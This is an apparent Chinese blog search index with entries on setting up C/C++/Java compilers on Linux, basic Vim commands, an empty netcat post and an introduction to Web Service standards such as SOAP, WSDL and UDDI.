    <entry>
      <title>Linux编译环境配置</title>
      <link href="/2022/07/01/Linux%E7%BC%96%E8%AF%91%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
      <url>/2022/07/01/Linux%E7%BC%96%E8%AF%91%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux下的编译环境配置"><a href="#Linux下的编译环境配置" class="headerlink" title="Linux下的编译环境配置"></a>Linux下的编译环境配置</h1><h2 id="C-C-环境配置"><a href="#C-C-环境配置" class="headerlink" title="C/C++环境配置"></a>C/C++环境配置</h2><h3 id="C编译环境的配置"><a href="#C编译环境的配置" class="headerlink" title="C编译环境的配置"></a>C编译环境的配置</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install gcc</span><br></pre></td></tr></table></figure><p>执行结束后我们可以查看版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc --version</span><br></pre></td></tr></table></figure><h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc --h</span><br></pre></td></tr></table></figure><p>可以查看该命令的所有操作</p><p>接下来我们写一个HelloWorld.c并编译运行。</p><p>vim HelloWorld.c</p><p>#include&lt;stdio.h&gt;<br>int main(void)</p><p>{<br>printf(“Hello World!\n”);<br>}</p><p>保存好后进行编译</p><p>gcc HelloWorld.c -o HelloWolrd</p><p>编译成功后运行</p><p>./HelloWorld</p><h3 id="C-编译环境配置"><a href="#C-编译环境配置" class="headerlink" title="C++编译环境配置"></a>C++编译环境配置</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install g++</span><br></pre></td></tr></table></figure><p>查看版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">g++ --version</span><br></pre></td></tr></table></figure><p>使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">g++ --h</span><br></pre></td></tr></table></figure><p>查看该命令的所有操作</p><p>然后接下来我们用C++写一个HelloWorld.cpp</p><p>vim HelloWorld.cpp</p><p>#include<iostream><br>using namespace std;<br>int main(void){<br>cout&lt;&lt;”Hello World!”&lt;&lt;endl;<br>}</p><p>g++ HelloWorld.cpp -o HelloWorldcpp</p><p>./HelloWorldcpp</p><h2 id="JAVA环境配置"><a href="#JAVA环境配置" class="headerlink" title="JAVA环境配置"></a>JAVA环境配置</h2><p>输入<code>apt install openjdk-8-jre-headless</code></p><p>成功安装</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Vim指令</title>
      <link href="/2022/07/01/Vim%E6%8C%87%E4%BB%A4/"/>
      <url>/2022/07/01/Vim%E6%8C%87%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h1 id="Vim-的基本使用方法"><a href="#Vim-的基本使用方法" class="headerlink" title="Vim 的基本使用方法"></a>Vim 的基本使用方法</h1><h2 id="Vim快捷键练习神器—-VimTutor"><a href="#Vim快捷键练习神器—-VimTutor" class="headerlink" title="Vim快捷键练习神器—-VimTutor"></a>Vim快捷键练习神器—-VimTutor</h2><p>VimTutor是新手可以快速入门Vim的一个Vim内置应用，直接在Vim命令行下，敲Vimtutor，回车即可进入练习。</p><h2 id="Vim的三种模式"><a href="#Vim的三种模式" class="headerlink" title="Vim的三种模式"></a>Vim的三种模式</h2><p>Vim可以分为三种模式，分别为：</p><ul><li><p>命令行模式（Command mode）</p></li><li><p>插入模式（Insert mode）</p></li><li><p>底行模式（Lastline mode）</p><p><strong>命令行模式</strong></p><blockquote><p>控制屏幕光标的移动，字符、字或行的删除，移动复制某区段及进入Insert mode下，或者到 last line mode。</p></blockquote><p><strong>插入模式</strong></p><blockquote><p>只有在Insert mode下，才可以做文字输入，按「ESC」键可回到命令行模式。</p></blockquote><p><strong>底行模式</strong></p><blockquote><p>将文件保存或退出vim，也可以设置编辑环境，如寻找字符串、列出行号……等。</p></blockquote></li></ul><h1 id="Vim的基本操作"><a href="#Vim的基本操作" class="headerlink" title="Vim的基本操作"></a>Vim的基本操作</h1><ol><li><p>进入Vim</p><p>在系统光标提示符后，输入vim及文件名后，回车，进入Vim编辑画面。</p><p>特别注意，进入vim之后，是处于「命令行模式（command mode）」，要切换到「插入模式 （Insert mode）」才能够输入文字。</p></li><li><p>切换至插入模式（Insert mode）编辑文件<br>在「命令行模式（command mode）」下按一下字母「i」就可以进入「插入模式（Insert mode）」，这时候你就可以开始输入文字了。</p></li><li><p>插入模式（Insert mode）切换到命令行模式（Command mode）<br>在插入模式下，按一下「ESC」键即可。</p></li><li><p>退出vim及保存文件 </p><p>在命令行模式（Command mode）下，按冒号「:」键，进入底行模式（Last Line mode）</p><p>常见底行模式下的命令行：</p><blockquote><p>:w filename 文件以filename为文件名保存</p><p>:wq 文件存盘并退出vim</p><p>:q 文件不存盘并退出vim</p><p>:q! 文件不存盘强制退出vim</p></blockquote></li></ol><h1 id="命令行模式下的功能键（部分）"><a href="#命令行模式下的功能键（部分）" class="headerlink" title="命令行模式下的功能键（部分）"></a>命令行模式下的功能键（部分）</h1><h3 id="在每行行首添加相同的内容："><a href="#在每行行首添加相同的内容：" class="headerlink" title="在每行行首添加相同的内容："></a>在每行行首添加相同的内容：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">:%s/^/要添加的内容</span><br></pre></td></tr></table></figure><h3 id="在每行行尾添加相同的内容："><a href="#在每行行尾添加相同的内容：" class="headerlink" title="在每行行尾添加相同的内容："></a>在每行行尾添加相同的内容：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">:%s/$/要添加的内容</span><br></pre></td></tr></table></figure><h3 id="删除单词："><a href="#删除单词：" class="headerlink" title="删除单词："></a>删除单词：</h3><blockquote><p>dw：把光标停留在需要删除的单词前面，依次按下「d」「w」，即可</p><p>de：把光标停留在需要删除的单词前面（无视单词前面的空格），依次按下「d」「e」，即可</p></blockquote><h3 id="从当前光标处删除到行末"><a href="#从当前光标处删除到行末" class="headerlink" title="从当前光标处删除到行末"></a>从当前光标处删除到行末</h3><blockquote><p> 把光标停留在需要删除的句子前面，依次按下「d」「$」，即可</p></blockquote><h3 id="快速跳转到行首"><a href="#快速跳转到行首" class="headerlink" title="快速跳转到行首"></a>快速跳转到行首</h3><blockquote><p>按下数字「0」，即可</p></blockquote><h3 id="使用计数以删除单词"><a href="#使用计数以删除单词" class="headerlink" title="使用计数以删除单词"></a>使用计数以删除单词</h3><blockquote><p> 示例：this ABC DE line FGHI JK LMN OP of words is Q RS TUV cleaned up.</p><p> 依次将鼠标定位到ABC前，按「d」「2」「w」，可以删除：ABC DE</p><p> 将鼠标定位到FGHI前，按「d」「4」「w」，可以删除：FGHI JK LMN OP</p><p> 将鼠标定位到Q前，按「d」「3」「w」，可以删除：Q RS TUV</p><p> 得到句子：</p><p> this line of words is cleaned up.</p></blockquote><h3 id="删除当前行"><a href="#删除当前行" class="headerlink" title="删除当前行"></a>删除当前行</h3><blockquote><p>鉴于删除当前行这一操作的高频性，vim设计者简化了快捷键，按「d」「d」即可。</p><p>连续删除两行，从当前行开始，则为：「2」「d」「d」</p></blockquote><h3 id="撤销更改"><a href="#撤销更改" class="headerlink" title="撤销更改"></a>撤销更改</h3><blockquote><p>a. 按小写字母「u」，撤销上一步的更改操作；</p><p>b. 按大写字母「U」，撤销整行的更改操作；</p><p>c. 「Ctrl+R」撤销上一步「撤销操作」。</p></blockquote><h3 id="将刚删除的内容置入其他行"><a href="#将刚删除的内容置入其他行" class="headerlink" title="将刚删除的内容置入其他行"></a>将刚删除的内容置入其他行</h3><blockquote><p>之前刚刚删除的内容，会放入Vim编辑器的寄存器中。基于如此原理，可以将之认为成Windows操作系统的「剪切」操作。</p><p>先在想删除的行，按「d」「d」，进行删除操作；</p><p>再在想插入那行的前一行按「p」键即可。</p></blockquote><h3 id="替换"><a href="#替换" class="headerlink" title="替换"></a>替换</h3><blockquote><p>将光标放到需要改的字符前，先按「r」键，再输入想更改的字符即可。</p></blockquote><h3 id="跳转"><a href="#跳转" class="headerlink" title="跳转"></a>跳转</h3><blockquote><p>顶部跳转命令：先按「Control」+「g」键，在终端底部调出一栏，然后输入「g」「g」即可；</p><p>底部跳转命令：先按「Control」+「g」键，在终端底部调出一栏，然后输入大写字母「g」即可；</p><p>特定行跳转命令：直接输入行号，然后输入大写字母「g」即可。</p></blockquote><h3 id="查找命令"><a href="#查找命令" class="headerlink" title="查找命令"></a>查找命令</h3><h4 id="字符串查找："><a href="#字符串查找：" class="headerlink" title="字符串查找："></a>字符串查找：</h4><blockquote><p>输入英文斜杠「/」，后面紧接需要搜索的字符串即可。</p><p>查找下一个相同字符串，就紧接着按小写字母「n」；</p><p>查找上一个相同字符串，就紧接着按大写字母「N」。</p></blockquote><h4 id="配对括号查找："><a href="#配对括号查找：" class="headerlink" title="配对括号查找："></a>配对括号查找：</h4><blockquote><p>在编程语言里，配对括号「 ( 」「 ) 」「 { 」「 } 」很常见，当定位到一个配对括号的一半时（注意光标要定位在该括号之前），按「%」，即可自动跳转到与之匹配的第一个配对括号处。</p></blockquote><h3 id="替换字符串"><a href="#替换字符串" class="headerlink" title="替换字符串"></a>替换字符串</h3><p>当前行替换命令</p><blockquote><p>在标准命令行模式下，光标定位到当前行，按英文冒号「 ：」，再输入s/oldstring/newstring/g 回车，即可。</p><p>完整语句为：</p><p><strong>:s/dogg/dog/g</strong></p></blockquote><p>特定几行替换命令</p><blockquote><p>在标准命令行模式下，按英文冒号「 ：」，再输入#,#s/oldstring/newstring/g 回车，即可（其中#代表特定的首尾两行的行号）。</p><p>完整语句为：</p><p>**<em>*:*<em>5,8s/dogg/dog/g</em></em></p></blockquote><p>全文替换命令</p><blockquote><p>在标准命令行模式下，按英文冒号「 ：」，再输入%s/oldstring/newstring/g 回车，即可（其中#代表特定的首尾两行的行号）。</p><p>完整语句为：</p><p><strong><em>*:*</em>%s/dogg/dog/g</strong></p></blockquote><p>全文替换命令（每个匹配项替换前需确认）</p><blockquote><p>在标准命令行模式下，按英文冒号「 ：」，再输入%s/oldstring/newstring/gc 回车，即可（其中#代表特定的首尾两行的行号）。</p><p>完整语句为：</p><p><strong><em>*:*</em>%s/dogg/dog/gc</strong></p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>netcat的使用</title>
      <link href="/2022/05/19/netcat%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
      <url>/2022/05/19/netcat%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Web Services</title>
      <link href="/2022/05/18/Web-Services/"/>
      <url>/2022/05/18/Web-Services/</url>
      
        <content type="html"><![CDATA[<h1 id="Web-Services"><a href="#Web-Services" class="headerlink" title="Web Services"></a>Web Services</h1><h2 id="简介："><a href="#简介：" class="headerlink" title="简介："></a>简介：</h2><p>​        Web Service是一个<a href="https://baike.baidu.com/item/%E5%B9%B3%E5%8F%B0/1064049">平台</a>独立的，低耦合的，自包含的、基于可<a href="https://baike.baidu.com/item/%E7%BC%96%E7%A8%8B">编程</a>的web的应用程序，可使用开放的<a href="https://baike.baidu.com/item/XML">XML</a>（<a href="https://baike.baidu.com/item/%E6%A0%87%E5%87%86%E9%80%9A%E7%94%A8%E6%A0%87%E8%AE%B0%E8%AF%AD%E8%A8%80/6805073">标准通用标记语言</a>下的一个子集）<a href="https://baike.baidu.com/item/%E6%A0%87%E5%87%86/219665">标准</a>来<a href="https://baike.baidu.com/item/%E6%8F%8F%E8%BF%B0/8928757">描述</a>、发布、发现、协调和配置这些应用程序，用于开发分布式的交互操作的<a href="https://baike.baidu.com/item/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F/5985445">应用程序</a>。 [1] </p><p>​        Web Service技术，  能使得运行在不同机器上的不同应用无须借助附加的、专门的第三方软件或硬件， 就可相互交换数据或集成。依据Web Service规范实施的应用之间， 无论它们所使用的语言、 平台或内部协议是什么， 都可以相互交换数据。Web Service是自描述、 自包含的可用网络模块，  可以执行具体的业务功能。Web Service也很容易部署， 因为它们基于一些常规的产业标准以及已有的一些技术，诸如<a href="https://baike.baidu.com/item/%E6%A0%87%E5%87%86%E9%80%9A%E7%94%A8%E6%A0%87%E8%AE%B0%E8%AF%AD%E8%A8%80/6805073">标准通用标记语言</a>下的子集<a href="https://baike.baidu.com/item/XML">XML</a>、HTTP。Web Service减少了应用接口的花费。Web Service为整个企业甚至多个组织之间的业务流程的集成提供了一个通用机制。</p><h2 id="支持："><a href="#支持：" class="headerlink" title="支持："></a>支持：</h2><p>Web Service平台需要一套协议来实现<a href="https://baike.baidu.com/item/%E5%88%86%E5%B8%83%E5%BC%8F%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F">分布式应用程序</a>的创建。任何平台都有它的<a href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E8%A1%A8%E7%A4%BA">数据表示</a>方法和类型系统。要实现<a href="https://baike.baidu.com/item/%E4%BA%92%E6%93%8D%E4%BD%9C%E6%80%A7">互操作性</a>，Web Service平台必须提供一套标准的类型系统，用于沟通不同平台、编程语言和<a href="https://baike.baidu.com/item/%E7%BB%84%E4%BB%B6%E6%A8%A1%E5%9E%8B">组件模型</a>中的不同类型系统。这些协议有：</p><p><strong>XML和XSD</strong></p><p>可扩展的<a href="https://baike.baidu.com/item/%E6%A0%87%E8%AE%B0%E8%AF%AD%E8%A8%80">标记语言</a>（<a href="https://baike.baidu.com/item/%E6%A0%87%E5%87%86%E9%80%9A%E7%94%A8%E6%A0%87%E8%AE%B0%E8%AF%AD%E8%A8%80">标准通用标记语言</a>下的一个子集）是Web Service平台中表示数据的基本格式。除了易于建立和易于分析外，XML主要的优点在于它既与平台无关，又与厂商无关。XML是由万维网协会(W3C)创建，W3C制定的XML SchemaXSD　定义了一套标准的<a href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B">数据类型</a>，并给出了一种语言来扩展这套<a href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B">数据类型</a>。</p><p>Web Service平台是用XSD来作为<a href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B">数据类型</a>系统的。当你用某种语言如VB. NET或C#　来构造一个Web Service时，为了符合Web Service标准，所有你使用的<a href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B">数据类型</a>都必须被转换为XSD类型。如想让它使用在不同平台和不同<a href="https://baike.baidu.com/item/%E8%BD%AF%E4%BB%B6">软件</a>的不同组织间传递，还需要用某种东西将它包装起来。这种东西就是一种协议，如 SOAP。</p><p><strong>SOAP</strong></p><p>SOAP即<a href="https://baike.baidu.com/item/%E7%AE%80%E5%8D%95%E5%AF%B9%E8%B1%A1%E8%AE%BF%E9%97%AE%E5%8D%8F%E8%AE%AE">简单对象访问协议</a>(Simple Object Access Protocol)，它是用于交换<a href="https://baike.baidu.com/item/XML">XML</a>（<a href="https://baike.baidu.com/item/%E6%A0%87%E5%87%86%E9%80%9A%E7%94%A8%E6%A0%87%E8%AE%B0%E8%AF%AD%E8%A8%80">标准通用标记语言</a>下的一个子集）编码信息的轻量级协议。它有三个主要方面：XML-envelope为描述信息内容和如何处理内容定义了框架，将程序对象编码成为XML对象的规则，执行<a href="https://baike.baidu.com/item/%E8%BF%9C%E7%A8%8B%E8%BF%87%E7%A8%8B%E8%B0%83%E7%94%A8">远程过程调用</a>(RPC)的约定。SOAP可以运行在任何其他<a href="https://baike.baidu.com/item/%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE">传输协议</a>上。例如，你可以使用 SMTP，即因特网<a href="https://baike.baidu.com/item/%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E5%8D%8F%E8%AE%AE">电子邮件协议</a>来传递SOAP消息，这可是很有诱惑力的。在<a href="https://baike.baidu.com/item/%E4%BC%A0%E8%BE%93%E5%B1%82">传输层</a>之间的头是不同的，但XML有效负载保持相同。</p><p>Web Service 希望实现不同的系统之间能够用“<a href="https://baike.baidu.com/item/%E8%BD%AF%E4%BB%B6">软件</a>-软件对话”的方式相互调用，打破了软件应用、网站和各种设备之间的格格不入的状态，实现“基于Web无缝集成”的目标。</p><p><strong>WSDL</strong></p><p>Web Service描述语言WSDL　就是用机器能阅读的方式提供的一个正式描述文档而基于<a href="https://baike.baidu.com/item/XML">XML</a>（<a href="https://baike.baidu.com/item/%E6%A0%87%E5%87%86%E9%80%9A%E7%94%A8%E6%A0%87%E8%AE%B0%E8%AF%AD%E8%A8%80">标准通用标记语言</a>下的一个子集）的语言，用于描述Web Service及其函数、参数和返回值。因为是基于XML的，所以WSDL既是机器可阅读的，又是人可阅读的。</p><p><strong>UDDI</strong></p><p>UDDI 的目的是为电子商务建立标准；UDDI是一套基于Web的、分布式的、为Web Service提供的、信息注册中心的实现标准规范，同时也包含一组使企业能将自身提供的Web Service注册，以使别的企业能够发现的访问协议的实现标准。</p><p><strong>调用RPC与消息传递</strong></p><p>Web Service本身其实是在实现应用程序间的通信。我们有两种应用程序通信的方法：RPC<a href="https://baike.baidu.com/item/%E8%BF%9C%E7%A8%8B%E8%BF%87%E7%A8%8B%E8%B0%83%E7%94%A8">远程过程调用</a>　和消息传递。使用RPC的时候，<a href="https://baike.baidu.com/item/%E5%AE%A2%E6%88%B7%E7%AB%AF">客户端</a>的概念是调用服务器上的远程过程，通常方式为实例化一个远程对象并调用其方法和属性。RPC系统试图达到一种位置上的透明性：服务器暴露出远程对象的接口，而<a href="https://baike.baidu.com/item/%E5%AE%A2%E6%88%B7%E7%AB%AF">客户端</a>就好像在本地使用的这些对象的接口一样，这样就隐藏了底层的信息，客户端也就根本不需要知道对象是在哪台机器上。</p><h2 id="应用："><a href="#应用：" class="headerlink" title="应用："></a>应用：</h2><p>Web service到底是什么；在什么情况下你应该使用Web service。</p><p>研究一下当前的<a href="https://baike.baidu.com/item/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E5%BC%80%E5%8F%91">应用程序开发</a>，你会发现一个绝对的倾向：人们开始偏爱基于<a href="https://baike.baidu.com/item/%E6%B5%8F%E8%A7%88%E5%99%A8">浏览器</a>的客户端应用程序。这当然不是因为客户端能够提供更好的用户界面，而是因为它能够避免花在<a href="https://baike.baidu.com/item/%E6%A1%8C%E9%9D%A2%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F">桌面应用程序</a>发布上的高成本。发布<a href="https://baike.baidu.com/item/%E6%A1%8C%E9%9D%A2%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F">桌面应用程序</a>成本很高，一半是因为应用程序安装和配置的问题，另一半是因为客户端和服务器之间通信的问题。</p><p>传统的Windows客户应用程序使用DCOM来与服务器进行通信和调用远程对象。配置好DCOM使其在一个大型的网络中正常工作将是一个极富挑战性的工作，同时也是许多IT工程师的噩梦。事实上，许多IT工程师宁愿忍受<a href="https://baike.baidu.com/item/%E6%B5%8F%E8%A7%88%E5%99%A8">浏览器</a>所带来的功能限制，也不愿在局域网上去运行一个DCOM。在我看来，结果就是一个发布容易，但开发难度大而且用户界面极其受限的应用程序。极端的说，就是你花了更多的资金和时间，却开发出从用户看来功能更弱的应用程序。不信？问问你的会计师对新的基于浏览器的<a href="https://baike.baidu.com/item/%E4%BC%9A%E8%AE%A1%E8%BD%AF%E4%BB%B6">会计软件</a>有什么想法：绝大多数商用程序用户希望使用更加友好的Windows用户界面。</p><p>关于<a href="https://baike.baidu.com/item/%E5%AE%A2%E6%88%B7%E7%AB%AF">客户端</a>与服务器的通信问题，一个完美的解决方法是使用HTTP协议来通信。这是因为任何运行<a href="https://baike.baidu.com/item/Web%E6%B5%8F%E8%A7%88%E5%99%A8">Web浏览器</a>的机器都在使用HTTP协议。同时，当前许多<a href="https://baike.baidu.com/item/%E9%98%B2%E7%81%AB%E5%A2%99">防火墙</a>也配置为只允许HTTP连接。</p><p>许多商用程序还面临另一个问题，那就是与其他程序的<a href="https://baike.baidu.com/item/%E4%BA%92%E6%93%8D%E4%BD%9C%E6%80%A7">互操作性</a>。如果所有的应用程序都是使用COM或.NET语言写的，并且都运行在Windows平台上，那就天下太平了。然而，事实上大多数商业数据仍然在大型主机上以非关系文件(VSAM)的形式存放，并由COBOL语言编写的大型机程序访问。而且，还有很多商用程序继续在使用C++、Java、Visual  Basic和其他各种各样的语言编写。除了最简单的程序之外，所有的应用程序都需要与运行在其他异构平台上的应用程序集成并进行数据交换。这样的任务通常都是由特殊的方法，如<a href="https://baike.baidu.com/item/%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93">文件传输</a>和分析，<a href="https://baike.baidu.com/item/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97">消息队列</a>，还有仅适用于某些情况的的API，如IBM的”高级程序到程序交流(APPC)”等来完成的。在以前，没有一个应用程序通信标准，是独立于平台、组建模型和<a href="https://baike.baidu.com/item/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80">编程语言</a>的。只有通过Web Service，<a href="https://baike.baidu.com/item/%E5%AE%A2%E6%88%B7%E7%AB%AF">客户端</a>和服务器才能够自由的用HTTP进行通信，不论两个程序的平台和<a href="https://baike.baidu.com/item/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80">编程语言</a>是什么。</p><p><strong>什么是Web Service</strong></p><p>对这个问题，我们至少有两种答案。从表面上看，Web service  就是一个应用程序，它向外界暴露出一个能够通过Web进行调用的API。这就是说，你能够用编程的方法通过Web来调用这个应用程序。我们把调用这个Web service 的应用程序叫做客户。例如，你想创建一个Web service  ，它的作用是返回当前的天气情况。那么你可以建立一个ASP页面，它接受邮政编码作为查询字符串，然后返回一个由逗号隔开的字符串，包含了当前的气温和天气。要调用这个ASP页面，<a href="https://baike.baidu.com/item/%E5%AE%A2%E6%88%B7%E7%AB%AF">客户端</a>需要发送下面的这个HTTP GET</p><p>返回的数据就应该是这样：</p><p>这个ASP页面就应该可以算作是Web service 了。因为它基于HTTP GET请求，暴露出了一个可以通过Web调用的API。当然，Web service 还有更多的东西。</p><p>下面是对Web service 更精确的解释： Web services是建立可互操作的<a href="https://baike.baidu.com/item/%E5%88%86%E5%B8%83%E5%BC%8F%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F">分布式应用程序</a>的新平台。作为一个Windows程序员，你可能已经用COM或DCOM建立过基于组件的<a href="https://baike.baidu.com/item/%E5%88%86%E5%B8%83%E5%BC%8F%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F">分布式应用程序</a>。COM是一个非常好的组件技术，但是我们也很容易举出COM并不能满足要求的情况。</p><p>Web service平台是一套标准，它定义了应用程序如何在Web上实现<a href="https://baike.baidu.com/item/%E4%BA%92%E6%93%8D%E4%BD%9C%E6%80%A7">互操作性</a>。你可以用任何你喜欢的语言，在任何你喜欢的平台上写Web service ，只要我们可以通过Web service标准对这些服务进行查询和访问。</p><p><strong>新平台</strong></p><p>Web service平台需要一套协议来实现<a href="https://baike.baidu.com/item/%E5%88%86%E5%B8%83%E5%BC%8F%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F">分布式应用程序</a>的创建。Web service平台必须提供一套标准的类型系统，用于沟通不同平台、编程语言和<a href="https://baike.baidu.com/item/%E7%BB%84%E4%BB%B6%E6%A8%A1%E5%9E%8B">组件模型</a>中的不同类型系统。在传统的<a href="https://baike.baidu.com/item/%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F">分布式系统</a>中，基于界面(interface)的平台提供了一些方法来描述界面、方法和参数（译注：如COM和COBAR中的IDL语言）。同样的，Web service平台也必须提供一种标准来描述Web service，让客户可以得到足够的信息来调用这个Web  service。最后，我们还必须有一种方法来对这个Web service进行远程调用。这种方法实际是一种<a href="https://baike.baidu.com/item/%E8%BF%9C%E7%A8%8B%E8%BF%87%E7%A8%8B%E8%B0%83%E7%94%A8">远程过程调用</a>协议(RPC)。为了达到<a href="https://baike.baidu.com/item/%E4%BA%92%E6%93%8D%E4%BD%9C%E6%80%A7">互操作性</a>，这种RPC协议还必须与平台和编程语言无关。下面几个小节就简要介绍了组成Web service平台的这三个技术。</p><p><strong>XML和XSD</strong></p><p>可扩展的<a href="https://baike.baidu.com/item/%E6%A0%87%E8%AE%B0%E8%AF%AD%E8%A8%80">标记语言</a>（<a href="https://baike.baidu.com/item/%E6%A0%87%E5%87%86%E9%80%9A%E7%94%A8%E6%A0%87%E8%AE%B0%E8%AF%AD%E8%A8%80">标准通用标记语言</a>下的一个子集）是Web service平台中表示数据的基本格式。除了易于建立和易于分析外，XML主要的优点在于它既是平台无关的，又是厂商无关的。无关性是比技术优越性更重要的：<a href="https://baike.baidu.com/item/%E8%BD%AF%E4%BB%B6">软件</a>厂商是不会选择一个由竞争对手所发明的技术的。</p><p>XML解决了<a href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E8%A1%A8%E7%A4%BA">数据表示</a>的问题，但它没有定义一套标准的<a href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B">数据类型</a>，更没有说怎么去扩展这套数据类型。例如，整形数到底代表什么？16位，32位，还是64位？这些细节对实现<a href="https://baike.baidu.com/item/%E4%BA%92%E6%93%8D%E4%BD%9C%E6%80%A7">互操作性</a>都是很重要的。W3C制定的XML Schema(XSD)就是专门解决这个问题的一套标准。它定义了一套标准的数据类型，并给出了一种语言来扩展这套数据类型。Web service平台就是用XSD来作为其<a href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B">数据类型</a>系统的。当你用某种语言(如VB. NET或C#)来构造一个Web service时，为了符合Web service标准，所有你使用的数据类型都必须被转换为XSD类型。你用的工具可能已经自动帮你完成了这个转换，但你很可能会根据你的需要修改一下转换过程。</p><p><strong>SOAP</strong></p><p>Web service建好以后，你或者其他人就会去调用它。<a href="https://baike.baidu.com/item/%E7%AE%80%E5%8D%95%E5%AF%B9%E8%B1%A1%E8%AE%BF%E9%97%AE%E5%8D%8F%E8%AE%AE">简单对象访问协议</a>(SOAP)提供了标准的RPC方法来调用Web service。实际上，SOAP在这里有点用词不当：它意味着下面的Web  service是以对象的方式表示的，但事实并不一定如此：你完全可以把你的Web  service写成一系列的C函数，并仍然使用SOAP进行调用。SOAP规范定义了SOAP消息的格式，以及怎样通过HTTP协议来使用SOAP。SOAP也是基于<a href="https://baike.baidu.com/item/XML">XML</a>（<a href="https://baike.baidu.com/item/%E6%A0%87%E5%87%86%E9%80%9A%E7%94%A8%E6%A0%87%E8%AE%B0%E8%AF%AD%E8%A8%80">标准通用标记语言</a>下的一个子集）和XSD的，XML是SOAP的数据编码方式。</p><p><strong>WSDL</strong></p><p>你会怎样向别人介绍你的Web service有什么功能，以及每个<a href="https://baike.baidu.com/item/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8">函数调用</a>时的参数呢？你可能会自己写一套文档，你甚至可能会口头上告诉需要使用你的Web service的人。这些非正式的方法至少都有一个严重的问题：当程序员坐到电脑前，想要使用你的Web  service的时候，他们的工具(如Visual Studio)无法给他们提供任何帮助，因为这些工具根本就不了解你的Web service。</p><p>解决方法是：用机器能阅读的方式提供一个正式的描述文档。Web service描述语言(<a href="https://baike.baidu.com/item/WSDL">WSDL</a>)就是这样一个基于<a href="https://baike.baidu.com/item/XML">XML</a>（<a href="https://baike.baidu.com/item/%E6%A0%87%E5%87%86%E9%80%9A%E7%94%A8%E6%A0%87%E8%AE%B0%E8%AF%AD%E8%A8%80">标准通用标记语言</a>下的一个子集）的语言，用于描述Web service及其函数、<a href="https://baike.baidu.com/item/%E5%8F%82%E6%95%B0">参数</a>和返回值。<a href="https://baike.baidu.com/item/WSDL">WSDL</a>既是机器可阅读的，又是人可阅读的，这将是一个很大的好处。一些最新的开发工具既能根据你的Web service生成WSDL文档，又能导入WSDL文档，生成调用相应Web service的代码。</p><p><strong>UDDI</strong></p><p>Universal Description, Discovery and Integration</p><p>为加速Web Service的推广、加强Web Service的互操作能力而推出的一个计划,基于标准的服务描述和发现的规范(specification)。</p><p>以<a href="https://baike.baidu.com/item/%E8%B5%84%E6%BA%90%E5%85%B1%E4%BA%AB">资源共享</a>的方式由多个运作者一起以Web Service的形式运作UDDI商业注册中心。</p><p>UDDI计划的核心组件是UDDI商业注册，它使用<a href="https://baike.baidu.com/item/XML%E6%96%87%E6%A1%A3">XML文档</a>来描述企业及其提供的Web Service。</p><p>UDDI商业注册提供三种信息：</p><p>White Page包含地址、联系方法、已知的<a href="https://baike.baidu.com/item/%E4%BC%81%E4%B8%9A%E6%A0%87%E8%AF%86">企业标识</a>。</p><p>Yellow Page包含基于标准分类法的行业类别。</p><p>Green Page包含关于该企业所提供的Web Service的技术信息，其形式可能是指向文件或<a href="https://baike.baidu.com/item/URL">URL</a>的指针，而这些文件或URL是为服务发现机制服务的。</p><p><strong>Web Service开发实例</strong></p><ol><li>利用WebService实现数据添加</li><li>利用WebService实现数据删除</li><li>利用WebService给手机发短信 [2] </li></ol><p><strong>适合使用Web 